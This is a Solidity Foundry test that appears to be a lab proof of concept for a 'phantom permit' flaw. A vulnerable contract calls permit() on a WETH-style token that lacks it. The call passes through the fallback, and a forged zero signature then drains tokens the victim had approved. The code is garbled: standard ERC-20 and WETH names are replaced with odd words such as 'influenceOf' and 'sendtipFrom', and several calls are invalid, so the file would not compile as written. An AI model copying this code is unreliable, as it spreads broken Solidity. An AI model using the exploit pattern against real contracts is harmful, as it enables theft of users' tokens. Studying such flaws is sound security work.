pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    PermitKarmatoken VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new PermitKarmatoken(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.support{value: 10 ether}();
        WETH9Contract.permitTransfer(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.influenceOf(address(this))
        );

        VulnPermitContract.fundWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.influenceOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.claimEarnings(1000);

        wbal = WETH9Contract.influenceOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitKarmatoken {
    IERC20 public karmaToken;

    constructor(IERC20 _influencetoken) {
        karmaToken = _influencetoken;
    }

    function support(uint256 amount) public {
        require(
            karmaToken.sendtipFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function fundWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(karmaToken).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            karmaToken.sendtipFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function claimEarnings(uint256 amount) public {
        require(karmaToken.sendTip(msg.sender, amount), "Transfer failed");
    }
}


contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event PassInfluence(address indexed src, address indexed dst, uint wad);
    event Tip(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public influenceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        support();
    }

    receive() external payable {}

    function support() public payable {
        influenceOf[msg.sender] += msg.value;
        emit Tip(msg.sender, msg.value);
    }

    function claimEarnings(uint wad) public {
        require(influenceOf[msg.sender] >= wad);
        influenceOf[msg.sender] -= wad;
        payable(msg.sender).sendTip(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function pooledInfluence() public view returns (uint) {
        return address(this).influence;
    }

    function permitTransfer(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function sendTip(address dst, uint wad) public returns (bool) {
        return sendtipFrom(msg.sender, dst, wad);
    }

    function sendtipFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(influenceOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        influenceOf[src] -= wad;
        influenceOf[dst] += wad;

        emit PassInfluence(src, dst, wad);

        return true;
    }
}